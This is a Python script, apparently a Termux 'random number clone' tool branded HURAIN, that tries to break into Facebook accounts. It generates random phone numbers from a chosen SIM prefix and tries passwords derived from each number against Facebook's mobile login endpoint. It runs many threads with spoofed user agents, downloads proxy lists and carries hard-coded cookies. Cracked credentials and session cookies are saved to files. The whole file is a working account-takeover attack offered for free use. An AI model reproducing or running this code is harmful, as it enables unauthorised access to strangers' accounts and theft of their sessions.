""" Fucked By HURAIN-CYBER
    Good Bye """

import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('pkg install espeak')

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen = []
ses = requests.Session()

# Screenshot se li gayi exact cookies
global_cookies = {
    'datr': 'P6mGanDWhVqWCHkmwNLsg_sy',
    'sb': 'P6mGano5kyrx899fgL5UvC-L',
    'm_pixel_ratio': '2',
    'wd': '360x800',
    'fr': '0qP7aHeRoyeJkm0rb..Bqhqk_..AAA.0.0.Bqhqla.AWd5QRri0sjcaVhnhQs2eaXa_ms',
}

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('')
prox = open('.prox.txt','r').read().splitlines()

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android 10; K)'
    b=random.choice(['7.0','8.1.0','9','10','11','12','13','14','15'])
    c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    d=random.randrange(115,140)
    e='0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}) {c}{d}{e}'
    ugen.append(uaku2)

logo = ("""
\x1b[1;91m┳ ┳ ┳ ┳━┓ ┳━┓ ┳━┓ ┳ ┳ 
\033[1;32m┣━┫ ┃ ┣━┫ ┣━┫ ┣━┫ ┃ ┃ 
\033[1;31m┻ ┻ ┻ ┻ ┻ ┻ ┻ ┻ ┻ ┗━┛ 
            
                                  \x1b[1;96m𝐇 𝐮 𝐫 𝐚 𝐢 𝐧                                                  

     \033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m═HURAIN-TEAM═\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══
     \x1b[1;96m Author        : \033[1;32m        HURAIN
     \x1b[1;96m Facebook     :  \033[1;32m        HURAIN
     \x1b[1;96m GitHub        : \033[1;32m         HURAIN 
     \x1b[1;96m Tool Status   : \033[1;32m         FREE X ENJOY
     \x1b[1;96m Team         : \033[1;32m         HURAIN-TECH
     \x1b[1;96m Tool Work    :  \033[1;32m        ONLY DATA
     \x1b[1;96m Version       : \033[1;32m         1.0.3
     \033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m═HURAIN-TEAM═\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══
""")                                              

class Main:
    def __init__(self):
        os.system("clear")
        print(logo)
        os.system('espeak -a 200 "Welcome Hurain project Random Clone"')
        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═HURAIN-TEAM═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
        print(" [01] RANDOM NUMBER CLONE \033[1;34m[ULTRA WORKING]")
        print(" [02] EXIT")
        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═HURAIN-TEAM═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
        Alif = input(" [?] Choose : ")
        if Alif in ["1", "01"]:
            num()
        else:
            exit()

def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    limit = int(input(' [?] Crack Your Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as noob:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═HURAIN-TEAM═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═HURAIN-TEAM═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru, kod+guru, kodex+guru, kode+kodex+kod]
            noob.submit(rcrack1, uid, pwx, tl)
    print('\n [+] Crack process has been completed')

def rcrack1(uid, pwx, tl):
    global loop
    global oks
    global cps
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r[HURAIN] > [{loop}/{tl}] > [OK:{len(oks)}] - [CP:{len(cps)}]\r')
            sys.stdout.flush()
            
            # Cookies attached to the request session
            free_fb = session.get('https://m.facebook.com', cookies=global_cookies).text
            
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "email": uid,
                "pass": ps,
                "login": "Log In"
            }
            header_freefb = {
                'authority': 'm.facebook.com',
                'method': 'POST',
                'path': '/login/device-based/regular/login/',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://m.facebook.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'upgrade-insecure-requests': '1',
                'user-agent': pro
            }
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100', data=log_data, headers=header_freefb, cookies=global_cookies).text
            log_cookies = session.cookies.get_dict().keys()
            
            if 'c_user' in log_cookies:
                coki = ";".join([key+"="+value for key, value in session.cookies.get_dict().items()])
                print(f"\n\033[38;5;46m[Hurain-OK💚] {uid} | {ps}\nCookie : {coki}")
                open('/sdcard/ok.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                print(f"\n\x1b[38;5;196m[HURAIN-CP🔪] {uid}|{ps}")
                open('/sdcard/cp.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass

Main()
